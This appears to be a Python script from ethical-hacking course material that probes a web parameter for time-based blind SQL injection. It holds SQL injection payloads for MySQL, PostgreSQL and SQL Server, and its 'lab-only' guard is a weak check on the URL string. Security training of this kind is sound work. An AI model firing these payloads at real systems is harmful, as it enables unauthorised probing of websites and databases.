#!/usr/bin/env python3
# LAB-ONLY: Time-Based SQL Injection Tester
# CEH v13 Master Module 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: This script tests for time-based blind SQL injection by injecting
# introducing delays (SLEEP, WAITFOR, etc.) and measuring response time differences!
import requests
import sys
import time

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
# 1. LAB_TARGET_URL: Change this to YOUR lab's vulnerable URL (e.g., http://192.168.100.10/vuln.php?id=)
LAB_TARGET_URL = "http://192.168.100.10/vuln.php?id="
# 2. LAB_BASE_DELAY: How many seconds the payload should delay (e.g., 5 = 5 seconds)
LAB_BASE_DELAY = 5
# 3. LAB_PAYLOAD_TEMPLATES: Templates for different DBMS (MySQL, PostgreSQL, SQL Server)
LAB_PAYLOAD_TEMPLATES = {
    "MySQL": [
        "' AND SLEEP({delay}) -- ",
        "'; SLEEP({delay}) -- ",
        "' OR SLEEP({delay}) -- "
    ],
    "PostgreSQL": [
        "' AND PG_SLEEP({delay}) -- ",
        "'; PG_SLEEP({delay}) -- "
    ],
    "SQL Server": [
        "'; WAITFOR DELAY '0:0:{delay}' -- ",
        "' AND WAITFOR DELAY '0:0:{delay}' -- "
    ]
}
# 4. LAB_THRESHOLD: If response takes > (delay + 1 seconds), mark as vulnerable
LAB_THRESHOLD = 1
# -----------------------------------------------------------------------------------

def test_time_delay(url, payload_template, delay):
    payload = payload_template.format(delay=delay)
    full_url = f"{url}{payload}"
    try:
        start = time.time()
        response = requests.get(full_url, timeout=delay + 5, verify=False)  # Lab-only: verify=False
        end = time.time()
        response_time = end - start
        return response_time, response.status_code
    except requests.exceptions.Timeout:
        return delay + 10, 408  # If timeout, assume delay worked!
    except Exception as e:
        return 0, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: Time-Based Blind SQL Injection Tester")
    print("="*80)
    print(f"[*] Target URL: {LAB_TARGET_URL}")
    print(f"[*] Base Delay: {LAB_BASE_DELAY} seconds")
    print("-"*80)
    for dbms, templates in LAB_PAYLOAD_TEMPLATES.items():
        print(f"\n[*] Testing {dbms} payloads...")
        for template in templates:
            resp_time, status = test_time_delay(LAB_TARGET_URL, template, LAB_BASE_DELAY)
            is_vulnerable = resp_time >= (LAB_BASE_DELAY + LAB_THRESHOLD)
            status_str = "🔴 VULNERABLE (Time-Based)" if is_vulnerable else "🟢 Not Vulnerable"
            print(f"Payload: {template:<60} | Time: {resp_time:.2f}s | {status_str}")
            if is_vulnerable:
                print(f"   -> Tested with {dbms} payload!")

if __name__ == "__main__":
    # Quick lab validation: Check if target URL is private lab IP
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: This script is LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
